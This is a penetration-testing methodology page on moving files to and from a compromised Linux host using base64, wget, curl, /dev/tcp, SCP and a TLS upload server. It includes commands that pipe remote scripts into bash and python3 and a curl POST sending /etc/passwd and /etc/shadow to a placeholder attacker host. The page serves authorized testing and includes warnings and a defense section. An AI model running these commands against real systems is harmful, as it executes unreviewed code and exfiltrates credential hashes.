---
layout: page
title: "File Transfers: Linux"
subtitle: "Moving files to and from Linux hosts with base64, web tools, SCP and a self-hosted upload server"
permalink: /methodology/shells-and-transfers/file-transfers-linux/
---

**Purpose:** get files onto a Linux target (download operations) and off it (upload operations) using tools that are likely to be present, and verify every transfer before relying on it.

## Workflow

1. Identify which tools exist on the target: `wget`, `curl`, `scp`, `nc`, `python3`, `php`, and so on.
2. Pick the simplest method the target supports. Work down the list if one fails.
3. Verify the hash of the file on the target against the original.

## Download operations

### Base64 copy and paste

Useful for small files such as an SSH key, when no other path exists. Encode on the source host and paste the output into the target:

```bash
cat id_rsa | base64 -w 0; echo
```

On the target, decode the string back to a file:

```bash
echo -n 'BASE64_STRING' | base64 -d > id_rsa
```

Compare checksums on both ends before use:

```bash
md5sum id_rsa
```

### Web downloads with wget and curl

```bash
wget http://ATTACKER_IP:8000/FILE -O /path/to/save/FILE
```

```bash
curl -o /path/to/save/FILE http://ATTACKER_IP:8000/FILE
```

### Fileless execution

Some payloads can be run without writing them to disk by piping the download into an interpreter:

```bash
curl https://RAW_HOST/LinEnum.sh | bash
```

```bash
wget -qO- https://RAW_HOST/helloworld.py | python3
```

> Piping remote content directly into a shell runs code you have not read. Use it only with content you have reviewed, and only on hosts where the test allows it.
{: .warning }

### Bash /dev/tcp

When neither `wget` nor `curl` is available, bash can open a TCP connection itself. This requires bash built with network redirection support (version 2.04 or later, compiled with `--enable-net-redirections`).

```bash
exec 3<>/dev/tcp/ATTACKER_IP/8000
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
cat <&3
```

### SCP downloads

```bash
scp USERNAME@ATTACKER_IP:/path/to/file .
```

A temporary account on the attack host can be created for the transfer, then removed.

## Upload operations

### Upload server with TLS

Install the uploadserver module on the attack host:

```bash
sudo python3 -m pip install --user uploadserver
```

Create a self-signed certificate in a directory that the web server will not serve:

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

Start the server, pointing it at the certificate:

```bash
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

From the compromised host, post the files. `--insecure` is needed here because the certificate is self-signed:

```bash
curl -X POST https://ATTACKER_IP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

> Uploading `/etc/shadow` moves password hashes off the host. Collect it only when the scope and the rules of engagement allow it, and handle it as sensitive data.
{: .warning }

### SCP upload

```bash
scp /etc/passwd USERNAME@TARGET_IP:/home/USERNAME/
```

## What to look for

- Which of `wget`, `curl`, `scp`, `nc` and `python3` exist on the target
- Outbound protocol filtering. A transfer over HTTPS can succeed where plain HTTP is blocked, and the reverse can also be true.
- Disk space and write permissions in the destination directory

## Pitfalls

- Base64 output can be truncated by terminal buffers. Verify the hash after decoding.
- Self-signed certificates require an explicit trust decision in the client, such as `--insecure`. Note this in the report.
- Upload servers must not expose the certificate file itself. Keep the certificate outside the served directory.

## Defense and prevention

Restrict outbound traffic from servers, so that unexpected downloads and uploads fail. Monitor for `curl` or `wget` invocations that send files to external addresses, and for new listening services on servers.
